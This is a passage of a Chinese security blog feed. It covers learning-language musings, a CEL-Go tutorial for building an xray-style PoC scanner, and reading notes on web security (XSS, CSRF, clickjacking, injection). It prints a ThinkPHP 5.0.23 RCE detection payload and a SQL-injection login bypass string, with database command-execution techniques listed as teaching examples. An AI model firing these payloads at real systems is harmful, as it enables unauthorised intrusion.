<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211203181902.png" alt="contents-mindnode"></p>
<p>但是我想说的是什么呢，之前和骏哥聊天，说想学一门语言。我的习惯是在知乎，豆瓣看各种推荐，书评，然后罗列一大堆，再<strong>精挑细选</strong>一本慢慢看。骏哥呢？一个字，<code>调</code>。go？并发好像是优势，直接上手写，不会的就看官方文档。java？直接编译jdk，开调。solidity？编译evm虚拟机，开调。</p>
<p>这就导致了一点，我好像永远停留在语言的层面上，并为之此乐此不疲，但也只是一些皮毛功夫。语言只是工具，项目驱动学习效果会更好一些。比如学习springboot，比起上来就依赖注入，控制反转等概念的介绍，不如先抄或者直接照搬一个别人的代码跑起来，断点看看数据的流向，有问题再逐个学习。</p>
<p>这样来看，新人学习的确很容易进入一个误区，就是想办法让自己学的全面，各种铺路，实话说到现在我也还没能改掉这个毛病。我们得明白学这门语言是为了什么，大多时候毫无意义的准备都是因为迷茫，如果你是为了想写扫描器学go，那不如了解一些基础语法后，马上上手项目。我感觉这是有一些本末倒置了,书籍还是适合在有一些经验的基础上，作为一种内功提升的工具，让你看完后感觉：<code>居然还能这样?我之前的写法真是nt</code>。该踩的坑还是要踩的，学习之路漫漫无期&hellip;</p>
]]></content>
		</item>
		
		<item>
			<title>Preliminary Study on CEL-Go</title>
			<link>https://theoyu.top/posts/cel-go/</link>
			<pubDate>Tue, 26 Oct 2021 23:24:32 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/cel-go/</guid>
			<description>前言 XRAY很牛逼，但是其并不开源，最近也是想写点东西，就自己也造个轮子，有时间的话就把Thinkphp，structs2，weblogic都整上了。
poc的话当然希望可以直接融合XRAY的poc，采用YAML格式，但有一个问题，比如我们一般用gopkg.in/yaml.v2把YAML解析为结构体，但如果YAML中出现一些表达式，就很难直接用结构体解决。(无脑正则当然ok)
name:poc-yaml-thinkphp5023-method-rcerules:- method:POSTpath:/index.php?s=captchaheaders:Content-Type:application/x-www-form-urlencodedbody:|_method=__construct&amp;amp;filter[]=printf&amp;amp;method=GET&amp;amp;server[REQUEST_METHOD]=TmlnaHQgZ2F0aGVycywgYW5%25%25kIG5vdyBteSB3YXRjaCBiZWdpbnMu&amp;amp;get[]=1expression:|response.status==200&amp;amp;&amp;amp;response.body.bcontains(b&amp;#34;TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu1&amp;#34;)detail:links:- https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce上面的expression其实很好理解，长得比较像python表达式，在python中eval可以直接对表达式求解，而我们现在也就需要一个高效的方法可以自定义求解表达式。
在XRAY-如何编写expression表达式中其实有提到一个库 ==&amp;gt; CEL-Go,官网介绍看了半天说实话不知道在干嘛&amp;hellip;查了查国内这方面的教程也几乎为0，不过好在Google大爹的codelabs实在良心，自己也跟着过一遍，算是入了个门，在这简单记录一下。
Introduction  CEL是为了安全的执行用户代码而设计的一门“语言”，就像用户在Python上盲目调用eval是危险的，但CEL可以安全的执行。
CEL多用于求解表达式，类似single line functions或者lambda表达式，并且通常用于计算bool值，但它也可用于构造更复杂的对象，如JSON或Protobuf。
 Key concepts  Variable bindings Function bindings for any custom extensions An AST to evaluate  Declare the variables cel中数据类型是绑定在protobuf上的，所以我们先简单写一个proto文件
syntax = &amp;#34;proto3&amp;#34;;package celDemo;option go_package = &amp;#34;celDemo/bp&amp;#34;;message Response{ string url = 1; int32 status =2; bytes body = 3;}生成对应go文件 == &amp;gt;protoc --go_out=. celDemo/http.proto
celDemo ├── bp │ └── http.pb.go ├── cel.go ├── cel_test.go └── http.</description>
			<content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>XRAY很牛逼，但是其并不开源，最近也是想写点东西，就自己也造个轮子，有时间的话就把<strong>Thinkphp，structs2，weblogic</strong>都整上了。</p>
<p>poc的话当然希望可以直接融合XRAY的poc，采用YAML格式，但有一个问题，比如我们一般用<code>gopkg.in/yaml.v2</code>把YAML解析为结构体，但如果YAML中出现一些表达式，就很难直接用结构体解决。(无脑正则当然ok)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">poc-yaml-thinkphp5023-method-rce</span><span class="w">
</span><span class="w"></span><span class="nt">rules</span><span class="p">:</span><span class="w">
</span><span class="w">  </span>- <span class="nt">method</span><span class="p">:</span><span class="w"> </span><span class="l">POST</span><span class="w">
</span><span class="w">    </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/index.php?s=captcha</span><span class="w">
</span><span class="w">    </span><span class="nt">headers</span><span class="p">:</span><span class="w">
</span><span class="w">      </span><span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l">application/x-www-form-urlencoded</span><span class="w">
</span><span class="w">    </span><span class="nt">body</span><span class="p">:</span><span class="w"> </span><span class="p">|</span><span class="sd">
</span><span class="sd">      </span><span class="w">      </span><span class="l">_method=__construct&amp;filter[]=printf&amp;method=GET&amp;server[REQUEST_METHOD]=TmlnaHQgZ2F0aGVycywgYW5%25%25kIG5vdyBteSB3YXRjaCBiZWdpbnMu&amp;get[]=1</span><span class="w">
</span><span class="w">    </span><span class="nt">expression</span><span class="p">:</span><span class="w"> </span><span class="p">|</span><span class="sd">
</span><span class="sd">      </span><span class="w">      </span><span class="l">response.status==200&amp;&amp;response.body.bcontains(b&#34;TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu1&#34;)</span><span class="w">
</span><span class="w"></span><span class="nt">detail</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">links</span><span class="p">:</span><span class="w">
</span><span class="w">    </span>- <span class="l">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</span><span class="w">
</span></code></pre></div><p>上面的<code>expression</code>其实很好理解，长得比较像python表达式，在python中eval可以直接对表达式求解，而我们现在也就需要一个高效的方法可以自定义求解表达式。</p>
<p>在<a href="https://docs.xray.cool/#/guide/poc?id=%e5%a6%82%e4%bd%95%e7%bc%96%e5%86%99expression%e8%a1%a8%e8%be%be%e5%bc%8f">XRAY-如何编写expression表达式</a>中其实有提到一个库 ==&gt; <a href="https://github.com/google/cel-go">CEL-Go</a>,官网介绍看了半天说实话不知道在干嘛&hellip;查了查国内这方面的教程也几乎为0，不过好在Google大爹的<a href="https://codelabs.developers.google.com/codelabs/cel-go/#0">codelabs</a>实在良心，自己也跟着过一遍，算是入了个门，在这简单记录一下。</p>
<h2 id="introduction">Introduction</h2>
<blockquote>
<p>CEL是为了安全的执行用户代码而设计的一门“语言”，就像用户在Python上盲目调用<code>eval</code>是危险的，但CEL可以安全的执行。</p>
<p>CEL多用于求解表达式，类似single line functions或者lambda表达式，并且通常用于计算bool值，但它也可用于构造更复杂的对象，如JSON或Protobuf。</p>
</blockquote>
<h2 id="key-concepts">Key concepts</h2>
<ul>
<li>Variable bindings</li>
<li>Function bindings for any custom extensions</li>
<li>An AST to evaluate</li>
</ul>
<h2 id="declare-the-variables">Declare the variables</h2>
<p>cel中数据类型是绑定在protobuf上的，所以我们先简单写一个proto文件</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-protobuf" data-lang="protobuf"><span class="n">syntax</span> <span class="o">=</span> <span class="s">&#34;proto3&#34;</span><span class="p">;</span><span class="err">
</span><span class="err"></span><span class="kn">package</span> <span class="nn">celDemo</span><span class="p">;</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">option</span> <span class="n">go_package</span> <span class="o">=</span> <span class="s">&#34;celDemo/bp&#34;</span><span class="p">;</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="kd">message</span> <span class="nc">Response</span><span class="p">{</span><span class="err">
</span><span class="err"></span>  <span class="kt">string</span> <span class="n">url</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="err">
</span><span class="err"></span>  <span class="kt">int32</span> <span class="n">status</span> <span class="o">=</span><span class="mi">2</span><span class="p">;</span><span class="err">
</span><span class="err"></span>  <span class="kt">bytes</span> <span class="n">body</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span><span class="err">
</span><span class="err"></span><span class="p">}</span><span class="err">
</span></code></pre></div><p>生成对应go文件 == &gt;<code>protoc --go_out=. celDemo/http.proto</code></p>
<pre><code>celDemo
├── bp
│   └── http.pb.go
├── cel.go 
├── cel_test.go 
└── http.proto
</code></pre><p>cel是通过env来解析表达式，我们可以通过<code>env, err := cel.NewEnv()</code>创建一个独立的环境。</p>
<blockquote>
<p>NewEnv creates a program environment configured with the standard library of CEL functions and macros. The Env value returned can parse and check any CEL program which builds upon the core features documented in the CEL specification.</p>
</blockquote>
<p>之前提到要想让cel识别这个Response，就需要在创建env时加入我们的options</p>
<blockquote>
<p>The environment can be customized by providing the options cel.EnvOption to the call. Those options are able to disable macros, declare custom variables and functions, etc.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">type</span> <span class="nx">options</span> <span class="kd">struct</span> <span class="p">{</span>
	<span class="nx">envOptions</span>  <span class="p">[]</span><span class="nx">cel</span><span class="p">.</span><span class="nx">EnvOption</span>
	<span class="nx">programOptions</span>  <span class="p">[]</span><span class="nx">cel</span><span class="p">.</span><span class="nx">ProgramOption</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">newEnvOption</span><span class="p">()</span> <span class="o">*</span><span class="nx">options</span><span class="p">{</span>
	<span class="nx">opt</span><span class="o">:=</span> <span class="o">&amp;</span><span class="nx">options</span><span class="p">{}</span>
	<span class="nx">opt</span><span class="p">.</span><span class="nx">envOptions</span> <span class="p">=</span> <span class="p">[]</span><span class="nx">cel</span><span class="p">.</span><span class="nx">EnvOption</span><span class="p">{</span>
		<span class="nx">cel</span><span class="p">.</span><span class="nf">Types</span><span class="p">(</span>
			<span class="o">&amp;</span><span class="nx">bp</span><span class="p">.</span><span class="nx">Response</span><span class="p">{}),</span>
		<span class="nx">cel</span><span class="p">.</span><span class="nf">Declarations</span><span class="p">(</span>
			<span class="nx">decls</span><span class="p">.</span><span class="nf">NewVar</span><span class="p">(</span><span class="s">&#34;response&#34;</span><span class="p">,</span>
				<span class="nx">decls</span><span class="p">.</span><span class="nf">NewObjectType</span><span class="p">(</span><span class="s">&#34;celDemo.Response&#34;</span><span class="p">)),</span>
			<span class="p">),</span>
	<span class="p">}</span>
	<span class="nx">opt</span><span class="p">.</span><span class="nx">programOptions</span><span class="p">=</span> <span class="p">[]</span><span class="nx">cel</span><span class="p">.</span><span class="nx">ProgramOption</span><span class="p">{}</span>
	<span class="k">return</span> <span class="nx">opt</span>
<span class="p">}</span>
</code></pre></div><p>之后就能直接创建env</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go">	<span class="nx">options</span><span class="o">:=</span> <span class="nf">newEnvOption</span><span class="p">()</span>
	<span class="nx">env</span><span class="p">,</span><span class="nx">_</span> <span class="o">:=</span> <span class="nx">cel</span><span class="p">.</span><span class="nf">NewEnv</span><span class="p">(</span><span class="nx">cel</span><span class="p">.</span><span class="nf">Lib</span><span class="p">(</span><span class="nx">options</span><span class="p">))</span>

<span class="c1">//注意cel.Lib
</span><span class="c1"></span><span class="kd">func</span> <span class="nf">Lib</span><span class="p">(</span><span class="nx">l</span> <span class="nx">Library</span><span class="p">)</span> <span class="nx">EnvOption</span> <span class="p">{</span>
	<span class="k">return</span> <span class="kd">func</span><span class="p">(</span><span class="nx">e</span> <span class="o">*</span><span class="nx">Env</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="nx">Env</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
		<span class="kd">var</span> <span class="nx">err</span> <span class="kt">error</span>
		<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">opt</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">l</span><span class="p">.</span><span class="nf">CompileOptions</span><span class="p">()</span> <span class="p">{</span>
			<span class="nx">e</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nf">opt</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
				<span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="nx">e</span><span class="p">.</span><span class="nx">progOpts</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">progOpts</span><span class="p">,</span> <span class="nx">l</span><span class="p">.</span><span class="nf">ProgramOptions</span><span class="p">()</span><span class="o">...</span><span class="p">)</span>
		<span class="k">return</span> <span class="nx">e</span><span class="p">,</span> <span class="kc">nil</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="c1">//发现这里调用了l.CompileOptions(),l.ProgramOptions() 所以我们需要写入options的方法中：
</span><span class="c1"></span>
<span class="kd">func</span> <span class="p">(</span><span class="nx">opt</span> <span class="o">*</span><span class="nx">options</span><span class="p">)</span> <span class="nf">CompileOptions</span><span class="p">()</span> <span class="p">[]</span><span class="nx">cel</span><span class="p">.</span><span class="nx">EnvOption</span><span class="p">{</span>
	<span class="k">return</span> <span class="nx">opt</span><span class="p">.</span><span class="nx">envOptions</span>
<span class="p">}</span>
<span class="kd">func</span> <span class="p">(</span><span class="nx">opt</span> <span class="o">*</span><span class="nx">options</span><span class="p">)</span> <span class="nf">ProgramOptions</span><span class="p">()</span> <span class="p">[]</span><span class="nx">cel</span><span class="p">.</span><span class="nx">ProgramOption</span><span class="p">{</span>
	<span class="k">return</span> <span class="nx">opt</span><span class="p">.</span><span class="nx">programOptions</span>
<span class="p">}</span>
</code></pre></div><p>简单测试一下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">celDemo</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;celDemo/bp&#34;</span>
	<span class="s">&#34;github.com/google/cel-go/cel&#34;</span>
	<span class="s">&#34;testing&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nf">TestPoc</span><span class="p">(</span><span class="nx">t</span> <span class="o">*</span><span class="nx">testing</span><span class="p">.</span><span class="nx">T</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">poc</span> <span class="o">:=</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kd">interface</span><span class="p">{}{}</span>

	<span class="nx">poc</span><span class="p">[</span><span class="s">&#34;response&#34;</span><span class="p">]=</span> <span class="o">&amp;</span><span class="nx">bp</span><span class="p">.</span><span class="nx">Response</span><span class="p">{</span>
		<span class="nx">Url</span><span class="p">:</span> <span class="s">&#34;theoyu.top&#34;</span><span class="p">,</span>
		<span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span>
		<span class="nx">Body</span><span class="p">:</span> <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;who is theoyu&#34;</span><span class="p">),</span>
	<span class="p">}</span>

	<span class="nx">options</span><span class="o">:=</span> <span class="nf">newEnvOption</span><span class="p">()</span>
	<span class="nx">env</span><span class="p">,</span><span class="nx">_</span> <span class="o">:=</span> <span class="nx">cel</span><span class="p">.</span><span class="nf">NewEnv</span><span class="p">(</span><span class="nx">cel</span><span class="p">.</span><span class="nf">Lib</span><span class="p">(</span><span class="nx">options</span><span class="p">))</span>
	<span class="nx">ast</span><span class="p">,</span><span class="nx">iss</span><span class="o">:=</span><span class="nx">env</span><span class="p">.</span><span class="nf">Compile</span><span class="p">(</span><span class="s">&#34;response.status == 200&#34;</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">iss</span><span class="p">.</span><span class="nf">Err</span><span class="p">()</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">t</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">iss</span><span class="p">.</span><span class="nf">Err</span><span class="p">())</span>
	<span class="p">}</span>
	<span class="nx">prg</span><span class="p">,</span><span class="nx">err</span><span class="o">:=</span><span class="nx">env</span><span class="p">.</span><span class="nf">Program</span><span class="p">(</span><span class="nx">ast</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span><span class="p">{</span>
		<span class="nx">t</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="nx">out</span><span class="p">,</span><span class="nx">_</span><span class="p">,</span><span class="nx">_</span><span class="o">:=</span><span class="nx">prg</span><span class="p">.</span><span class="nf">Eval</span><span class="p">(</span><span class="nx">poc</span><span class="p">)</span>
	<span class="nx">t</span><span class="p">.</span><span class="nf">Log</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div><p>输出：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="o">==</span><span class="p">=</span> <span class="nx">RUN</span>   <span class="nx">TestPoc</span>
    <span class="nx">cel_test</span><span class="p">.</span><span class="k">go</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span> <span class="kc">true</span>
<span class="o">---</span> <span class="nx">PASS</span><span class="p">:</span> <span class="nf">TestPoc</span> <span class="p">(</span><span class="mf">0.01</span><span class="nx">s</span><span class="p">)</span>
<span class="nx">PASS</span>
</code></pre></div><h2 id="custom-functions">Custom Functions</h2>
<p>和变量一样，函数也在<code>EnvOption</code>中定义</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="nx">cel</span><span class="p">.</span><span class="nf">Declarations</span><span class="p">(</span>
			<span class="nx">decls</span><span class="p">.</span><span class="nf">NewFunction</span><span class="p">(</span><span class="s">&#34;bcontains&#34;</span><span class="p">,</span><span class="nx">decls</span><span class="p">.</span><span class="nf">NewInstanceOverload</span><span class="p">(</span>
				<span class="s">&#34;bytes_contains_bytes&#34;</span><span class="p">,</span>
				<span class="p">[]</span><span class="o">*</span><span class="nx">exprpb</span><span class="p">.</span><span class="nx">Type</span><span class="p">{</span><span class="nx">decls</span><span class="p">.</span><span class="nx">Bytes</span><span class="p">,</span><span class="nx">decls</span><span class="p">.</span><span class="nx">Bytes</span><span class="p">},</span>
				<span class="nx">decls</span><span class="p">.</span><span class="nx">Bool</span><span class="p">)),</span>
			<span class="p">),</span>
</code></pre></div><p>实现在<code>opt.programOptions</code>中完成</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go">	<span class="nx">opt</span><span class="p">.</span><span class="nx">programOptions</span><span class="p">=</span> <span class="p">[]</span><span class="nx">cel</span><span class="p">.</span><span class="nx">ProgramOption</span><span class="p">{</span>
		<span class="nx">cel</span><span class="p">.</span><span class="nf">Functions</span><span class="p">(</span>
			<span class="o">&amp;</span><span class="nx">functions</span><span class="p">.</span><span class="nx">Overload</span><span class="p">{</span>
				<span class="nx">Operator</span><span class="p">:</span>     <span class="s">&#34;bcontains&#34;</span><span class="p">,</span>
				<span class="nx">Binary</span><span class="p">:</span> <span class="kd">func</span><span class="p">(</span><span class="nx">lhs</span> <span class="nx">ref</span><span class="p">.</span><span class="nx">Val</span><span class="p">,</span> <span class="nx">rhs</span> <span class="nx">ref</span><span class="p">.</span><span class="nx">Val</span><span class="p">)</span> <span class="nx">ref</span><span class="p">.</span><span class="nx">Val</span><span class="p">{</span>
					<span class="k">return</span> <span class="nx">types</span><span class="p">.</span><span class="nf">Bool</span><span class="p">(</span><span class="nx">bytes</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">lhs</span><span class="p">.(</span><span class="nx">types</span><span class="p">.</span><span class="nx">Bytes</span><span class="p">),</span><span class="nx">rhs</span><span class="p">.(</span><span class="nx">types</span><span class="p">.</span><span class="nx">Bytes</span><span class="p">)))</span>
				<span class="p">},</span>
			<span class="p">},</span>
		<span class="p">),</span>
	<span class="p">}</span>
</code></pre></div><p>测试一下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="nx">ast</span><span class="p">,</span><span class="nx">iss</span><span class="o">:=</span><span class="nx">env</span><span class="p">.</span><span class="nf">Compile</span><span class="p">(</span><span class="s">`response.body.bcontains(b&#34;theoyu&#34;)`</span><span class="p">)</span>

<span class="nx">output</span><span class="p">:</span>
<span class="o">==</span><span class="p">=</span> <span class="nx">RUN</span>   <span class="nx">TestPoc</span>
    <span class="nx">cel_test</span><span class="p">.</span><span class="k">go</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span> <span class="kc">true</span>
<span class="o">---</span> <span class="nx">PASS</span><span class="p">:</span> <span class="nf">TestPoc</span> <span class="p">(</span><span class="mf">0.01</span><span class="nx">s</span><span class="p">)</span>
<span class="nx">PASS</span>
</code></pre></div>]]></content>
		</item>
		
		<item>
			<title>白帽子讲web安全</title>
			<link>https://theoyu.top/posts/course/whitehat-and-security/</link>
			<pubDate>Mon, 25 Oct 2021 10:26:13 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/course/whitehat-and-security/</guid>
			<description>前言 安全工程师的核心竞争力不在于拥有多少个0day，掌握多少种安全技术，而是在于他对安全理解的深度，以及由此引申的看待安全问题的角度和高度。
站在白帽子的视角，除了剖析攻击原理，更加需要关注如何防范这些漏洞。
第一章 我的安全世界观 数据从高等级的信任域流向低等级的信任域，是不需要经过安全检查的，反之则需要。
安全问题的本质是信任的问题。
安全三要素(CIA)：
 机密性(Confidentiality)：数据内容不能泄漏 完整性(Integrity)：数据内容完成，没有被篡改 ==&amp;gt; 数字签名 可用性(Availability)：拒绝服务攻击的是可用性  安全评估：
1. 资产等级划分 划分信任域和信任边界 互联网安全的核心问题，是数据安全的问题。 2. 威胁分析 威胁建模 书中提到的了TRIDE，不过现在ATT&amp;amp;CK应该更加全面。 3. 风险分析 Risk = Probability * Damage Potential 4. 确定解决方案 有效解决问题 用户体验好 高性能 低耦合 易于拓展和升级 白帽子兵法：
1. Secure By Default 原则： 使用白名单优于黑名单 最小权限原则 2. 纵深防御原则：在各个不同层次实施安全方案。 3. 数据与代码分离原则 4. 不可预测原则： 有效对抗基于篡改，伪造的攻击。 token防御CSRF。 第二章 浏览器安全 同源策略(Same origin Policy)：
限制来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。 影响“源”的因素：host、子域名、端口、协议。 页面存放文件的域并不重要，重要的是加载文件所在的域。 &amp;lt;script&amp;gt;、&amp;lt;img&amp;gt;、&amp;lt;iframe&amp;gt;等标签可以跨域加载资源 XMLHttpRequest受同源策略的约束，需要通过目标域返回的HTTP头来授权是否允许跨域访问。
对浏览器而言，除了DOM、Cookie、XMLHttpRequest受到同源策略的限制，浏览器第三方插件也有自己的同源策略（Flash、Java Applet、Google Gears）
浏览器沙箱：
Sandbox的设计的目的是为了让不可信任的代码运行在一定环境中，限制不可信任的代码访问隔离区之外的资源。如果需要跨越Sandbox边界交换数据，只能通过封装的API完成。</description>
			<content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>安全工程师的核心竞争力不在于拥有多少个0day，掌握多少种安全技术，而是在于他对安全理解的深度，以及由此引申的看待安全问题的角度和高度。</p>
<p>站在白帽子的视角，除了剖析攻击原理，更加需要关注如何防范这些漏洞。</p>
<h2 id="第一章-我的安全世界观">第一章 我的安全世界观</h2>
<p>数据从高等级的信任域流向低等级的信任域，是不需要经过安全检查的，反之则需要。</p>
<p><strong>安全问题的本质是信任的问题</strong>。</p>
<p>安全三要素(CIA)：</p>
<ul>
<li><strong>机密性(Confidentiality)</strong>：数据内容不能泄漏</li>
<li><strong>完整性(Integrity)</strong>：数据内容完成，没有被篡改 ==&gt; 数字签名</li>
<li><strong>可用性(Availability)</strong>：拒绝服务攻击的是可用性</li>
</ul>
<p>安全评估：</p>
<pre><code>1. 资产等级划分
	划分信任域和信任边界
	互联网安全的核心问题，是数据安全的问题。
2. 威胁分析
	威胁建模
	书中提到的了TRIDE，不过现在ATT&amp;CK应该更加全面。
3. 风险分析
	Risk = Probability * Damage Potential
4. 确定解决方案
	有效解决问题
	用户体验好
	高性能
	低耦合
	易于拓展和升级
</code></pre><p>白帽子兵法：</p>
<pre><code>1. Secure By Default 原则：
	使用白名单优于黑名单
	最小权限原则

2. 纵深防御原则：在各个不同层次实施安全方案。

3. 数据与代码分离原则

4. 不可预测原则：
	有效对抗基于篡改，伪造的攻击。
	token防御CSRF。
</code></pre><h2 id="第二章-浏览器安全">第二章 浏览器安全</h2>
<p><strong>同源策略(Same origin Policy)</strong>：</p>
<pre><code>限制来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。

影响“源”的因素：host、子域名、端口、协议。

页面存放文件的域并不重要，重要的是加载文件所在的域。

&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;等标签可以跨域加载资源
</code></pre><p>XMLHttpRequest受同源策略的约束，需要通过目标域返回的HTTP头来授权是否允许跨域访问。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/10/20211024174040.png" alt="image-20211024174040729"></p>
<p>对浏览器而言，除了DOM、Cookie、XMLHttpRequest受到同源策略的限制，浏览器第三方插件也有自己的同源策略（Flash、Java Applet、Google Gears）</p>
<p><strong>浏览器沙箱</strong>：</p>
<p>Sandbox的设计的目的是为了让<strong>不可信任的代码</strong>运行在一定环境中，限制不可信任的代码访问隔离区之外的资源。如果需要跨越Sandbox边界交换数据，只能通过封装的API完成。</p>
<p><strong>CSP(Content Security Policy)</strong>：</p>
<p>内容安全策略，是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。</p>
<p>通过服务器端返回一个HTTP头，描述其中描述页面应该遵守的安全策略。</p>
<h2 id="第三章-跨站脚本攻击xss">第三章 跨站脚本攻击(XSS)</h2>
<ul>
<li>
<p><strong>反射型XSS</strong>：</p>
<p>需要诱导用户点击恶意链接才能成功。</p>
</li>
<li>
<p><strong>存储型XSS</strong>：</p>
<p>恶意数据存储到了服务端。</p>
</li>
<li>
<p><strong>DOM Based XSS</strong></p>
<p>效果上也是反射性XSS，形成原因有所不同，通过修改页面DOM节点形成XSS。</p>
</li>
</ul>
<p><strong>XSS防御</strong> ==&gt; 认清XSS产生的本质原因</p>
<pre><code>XSS的本质是一种“HTML注入”，用户的数据呗当成了HTMl代码一部分来执行。

MVC架构的网站，XSS发生在View层，在拼接变量到HTML页面时产生，此时对用户提交数据进行检查的方案，并不是真正在真正发生攻击的地方防御。

HtmlEncode()
JavascriptEncode()
富文本限制白名单
......
</code></pre><h2 id="第四章-跨站点请求伪造csrf">第四章 跨站点请求伪造(CSRF)</h2>
<p><strong>CSRF：Cross Site Request Forgery</strong></p>
<p>主要利用了用户Cookie进行伪造操作 ==&gt; 不同浏览器的Cookie策略不同。</p>
<p>作为开发者应该在开发中主动规避而不是交给浏览器。</p>
<p><strong>防御：</strong></p>
<pre><code>1. 敏感操作加上验证码

2. 敏感路由验证referer

3. SameSite头
	Set-Cookie: foo=1; SameSite=Strict
	Set-Cookie: bar=2; SameSite=Lax
	Set-Cookie: baz=3
	详细参考 https://cnblogs.com/ziyunfei/p/5637945.html
		
4. Anti CSRF Token
</code></pre><p><strong>CSRF攻击的本质</strong>：攻击者可以猜测重要参数的所有参数</p>
<p>真随机 ==&gt; token</p>
<p>每次刷新后，token放在Session和需要敏感操作的表单里，提交请求时，服务器验证表单中的token和用户session中token是否一致。</p>
<p>利用xss获取token再进行csrf ==&gt; <strong>XSRF</strong></p>
<h2 id="第五章-点击劫持clickjacking">第五章 点击劫持(ClickJacking)</h2>
<p>多用做🎣，🪧，欺诈</p>
<p><strong>防御：</strong></p>
<pre><code>1. frame busting
	禁止iframe嵌套
2. X-Frame-Options
更多是在浏览器层面防御
</code></pre><h2 id="第六章-html-5-安全">第六章 HTML 5 安全</h2>
<h2 id="第七章-注入攻击">第七章 注入攻击</h2>
<p><strong>注入的本质</strong>：把用户输入的<strong>数据</strong>当作<strong>代码</strong>执行。</p>
<p>数据库攻击：</p>
<pre><code>- LOAD_FILE() INTO DUMPFILE 读写文件
- Mysql UDF(User-Defined Functions) 执行命令
- MS SQL Server ”xp_cmdshell“执行系统命令
- 字符集导致的编码问题
</code></pre><p>**防御：**预处理最佳</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/11/20211127201155.png" alt="1"></p>
<p>post ：<code>name=' or 1=1#&amp;password=</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/11/20211127201251.png" alt="image-20211123150224827"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="err">不使用预处理</span><span class="p">:</span><span class="w">
</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span><span class="s1">&#39; and password = &#39;&#39;
</span><span class="s1">使用预处理：
</span><span class="s1">select * from users where username = &#39;&#39;&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span><span class="s1">&#39; and password = &#39;&#39;
